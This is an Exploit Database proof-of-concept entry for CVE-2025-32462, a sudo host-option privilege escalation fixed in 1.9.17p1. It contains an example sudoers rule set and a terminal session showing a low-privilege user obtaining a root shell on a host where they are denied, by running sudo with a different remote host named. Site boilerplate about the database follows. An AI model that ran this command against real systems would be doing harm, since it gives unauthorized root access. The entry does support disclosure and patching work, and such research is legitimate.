# Exploit Title: Sudo 1.9.17 Host Option - Elevation of Privilege
# Date: 2025-06-30
# Exploit Author: Rich Mirch
# Vendor Homepage: https://www.sudo.ws
# Software Link: https://www.sudo.ws/dist/sudo-1.9.17.tar.gz
# Version: Stable 1.9.0 - 1.9.17, Legacy 1.8.8 - 1.8.32
# Fixed in: 1.9.17p1
# Vendor Advisory: https://www.sudo.ws/security/advisories/host_any
# Blog:
https://www.stratascale.com/vulnerability-alert-CVE-2025-32462-sudo-host
# Tested on: Ubuntu 24.04.1; Sudo 1.9.15p5, macOS Sequoia 15.3.2; Sudo
1.9.13p2
# CVE : CVE-2025-32462
#
No exploit is required. Executing a sudo or sudoedit command with the host
option referencing an unrelated remote host rule causes Sudo to treat the
rule as valid for the local system. As a result, any command allowed by the
remote host rule can be executed on the local machine.

Example /etc/sudoers file using the Host_Alias directive. The lowpriv user
is allowed to execute all commands (full root) on dev.test.local,
ci.test.local, but not prod.test.local.

Host_Alias     SERVERS        = prod.test.local, dev.test.local
Host_Alias     PROD           = prod.test.local
lowpriv          SERVERS, !PROD = NOPASSWD:ALL
lowpriv           ci.test.local  = NOPASSWD:ALL

Even though the prod.test.local server is explicitly denied for the lowpriv
user, root access is achieved by specifying the host option for the
dev.test.local or ci.test.local servers.

Example

Show that lowpriv is not allowed to execute sudo on the prod server.

lowpriv@prod:~$ id
uid=1001(lowpriv) gid=1001(lowpriv) groups=1001(lowpriv)
lowpriv@prod:~$ sudo -l
[sudo] password for lowpriv:
Sorry, user lowpriv may not run sudo on prod.

List the host rules for the dev.test.local server.

lowpriv@prod:~$ sudo -l -h dev.test.local
Matching Defaults entries for lowpriv on dev:
    env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
use_pty

User lowpriv may run the following commands on dev:
    (root) NOPASSWD: ALL

Execute a root shell on prod.test.local by specifying the -h dev.test.local
option.

lowpriv@prod:~$ sudo -h dev.test.local -i
sudo: a remote host may only be specified when listing privileges.
root@prod:~# id
uid=0(root) gid=0(root) groups=0(root)
```

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/?utm_source=edb&utm_medium=web&utm_campaign=www), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish o...
